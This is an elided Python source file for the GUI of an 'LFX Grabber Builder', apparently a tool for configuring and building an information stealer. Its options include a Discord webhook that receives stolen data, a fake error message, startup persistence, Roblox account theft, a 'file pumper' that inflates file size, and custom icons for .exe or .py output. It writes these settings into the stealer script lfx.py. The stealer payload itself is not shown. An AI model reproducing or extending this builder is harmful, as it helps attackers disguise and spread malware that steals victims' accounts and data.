...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("LFX Grabber Builder")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "lfx.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "lfx.png")), size=(500, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "lfx.png")), size=(20, 20))
        ...
        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}lfx.ico")

        self.navigation_frame = customtkinter.CTkFrame(self, corner_radius=0)
        self.navigation_frame.grid(row=0, column=0, sticky="nsew")
        self.navigation_frame.grid_rowconfigure(4, weight=1)

        self.navigation_frame_label = customtkinter.CTkLabel(self.navigation_frame, text="LFX Grabber Builder", image=self.logo_image,
        ...
        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=570, height=35, font=customtkinter.CTkFont(
            size=15, family=self.font), placeholder_text="https://discord.com/api/webhooks/1234567890/lfx")
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#FFA400", hover_color="#5057eb", font=customtkinter.CTkFont(size=15, family=self.font))
        ...
        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#FFA400", hover_color="#5057eb")
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#FFA400", hover_color="#5057eb")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#FFA400", button_hover_color="#5057eb", button_color="#4DFF00")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#FFA400", hover_color="#5057eb")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#FFA400", hover_color="#5057eb")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#FFA400", hover_color="#5057eb", command=self.check_roblox)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#FFA400", hover_color="#5057eb", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#FFA400", button_hover_color="#5057eb", button_color="#4DFF00")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=[".exe", ".py"],
                                                    ...
                                                    fg_color="#FFA400", button_hover_color="#5057eb", button_color="#4DFF00", command=lambda x: self.check_icon())
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=250, text="Add Icon", fg_color="#FFA400", hover_color="#5057eb",
        ...
        self.build = customtkinter.CTkButton(self.builder_frame, width=250, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#FFA400", hover_color="#5057eb", command=self.buildfile)
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#FFA400", hover_color="#5057eb",
                            font=customtkinter.CTkFont(size=33, family=self.font), command=self.get_icon)
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#FFA400", hover_color="#5057eb", text="Check Webhook")
    ...
    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#FFA400", hover_color="#5057eb")
                time.sleep(0.3)
                self.update()
    ...
    def get_config(self):
        with open(self.basefilepath + "\\lfx.py", 'r', encoding="utf-8") as f:
            code = f.read()
        ...
        if config_match:
            ...
            raise Exception("Could not find config in lfx.py")
